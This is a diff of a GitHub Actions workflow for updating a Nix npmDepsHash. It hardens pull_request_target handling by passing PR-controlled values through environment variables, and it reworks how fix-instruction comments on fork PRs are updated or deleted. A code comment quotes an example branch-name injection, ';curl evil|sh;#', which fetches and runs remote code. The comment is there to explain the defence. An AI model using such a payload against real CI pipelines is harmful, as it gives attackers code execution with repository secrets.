@@ -37,16 +37,21 @@ jobs:
       - name: Detect fork and pin head SHA
         id: pr
         env:
+          # All PR-controlled values are passed via env (never interpolated
+          # directly into `run:`). A fork branch named `;curl evil|sh;#`
+          # would otherwise get RCE under `pull_request_target`.
           HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
           BASE_REPO: ${{ github.repository }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          HEAD_REF: ${{ github.event.pull_request.head.ref }}
         run: |
           if [ "$HEAD_REPO" = "$BASE_REPO" ]; then
             echo "is_fork=false" >> "$GITHUB_OUTPUT"
           else
             echo "is_fork=true" >> "$GITHUB_OUTPUT"
           fi
-          echo "head_sha=${{ github.event.pull_request.head.sha }}" >> "$GITHUB_OUTPUT"
-          echo "head_ref=${{ github.event.pull_request.head.ref }}" >> "$GITHUB_OUTPUT"
+          echo "head_sha=$HEAD_SHA" >> "$GITHUB_OUTPUT"
+          echo "head_ref=$HEAD_REF" >> "$GITHUB_OUTPUT"
           echo "head_repo=$HEAD_REPO" >> "$GITHUB_OUTPUT"
 
       - name: Fetch lockfile and flake.nix from PR head (data, not code)
@@ -118,7 +123,7 @@ jobs:
           git -C pr-checkout config user.name "github-actions[bot]"
           git -C pr-checkout config user.email "github-actions[bot]@users.noreply.github.com"
           git -C pr-checkout commit \
-            -m "fix(ci): update Nix npmDepsHash for web dependencies" \
+            -m "chore: update Nix npmDepsHash for web dependencies" \
             -m "Co-authored-by: ${PR_AUTHOR} <${PR_AUTHOR_ID}+${PR_AUTHOR}@users.noreply.github.com>" \
             flake.nix
 
@@ -129,15 +134,31 @@ jobs:
             origin "HEAD:${HEAD_REF}"
 
       - name: Comment on fork PRs
-        if: steps.hash.outputs.changed == 'true' && steps.pr.outputs.is_fork == 'true'
+        if: steps.pr.outputs.is_fork == 'true'
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           NEW_HASH: ${{ steps.hash.outputs.computed }}
           CUR_HASH: ${{ steps.hash.outputs.current }}
+          CHANGED: ${{ steps.hash.outputs.changed }}
           PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
           set -euo pipefail
           MARKER="<!-- nix-npm-hash-fix-pr -->"
+
+          # `databaseId` (not `id`) returns the numeric REST ID; the GraphQL
+          # node id `IC_kw...` 404s on the REST PATCH/DELETE endpoints below.
+          EXISTING=$(gh pr view "$PR_NUMBER" --json comments \
+            --jq '.comments[] | select(.body | startswith("<!-- nix-npm-hash-fix-pr -->")) | .databaseId' \
+            | head -n1)
+
+          if [ "$CHANGED" = "false" ]; then
+            if [ -n "$EXISTING" ]; then
+              gh api --method DELETE \
+                "/repos/${{ github.repository }}/issues/comments/${EXISTING}" >/dev/null
+            fi
+            exit 0
+          fi
+
           {
             echo "$MARKER"
             echo
@@ -151,16 +172,11 @@ jobs:
             echo '```'
             echo "sed -i -E '/^[[:space:]]*npmDepsHash[[:space:]]*=[[:space:]]*\"sha256-/s|sha256-[^\"]*|${NEW_HASH}|' flake.nix"
             echo "git add flake.nix"
-            echo "git commit -m 'fix(ci): update Nix npmDepsHash for web dependencies'"
+            echo "git commit -m 'chore: update Nix npmDepsHash for web dependencies'"
             echo "git push"
             echo '```'
           } > /tmp/comment-body.md
 
-          # `databaseId` (not `id`) returns the numeric REST ID; the GraphQL
-          # node id `IC_kw...` 404s on the REST PATCH endpoint below.
-          EXISTING=$(gh pr view "$PR_NUMBER" --json comments \
-            --jq '.comments[] | select(.body | startswith("<!-- nix-npm-hash-fix-pr -->")) | .databaseId' \
-            | head -n1)
           if [ -n "$EXISTING" ]; then
             gh api --method PATCH "/repos/${{ github.repository }}/issues/comments/${EXISTING}" \
               -f body="$(cat /tmp/comment-body.md)" >/dev/null
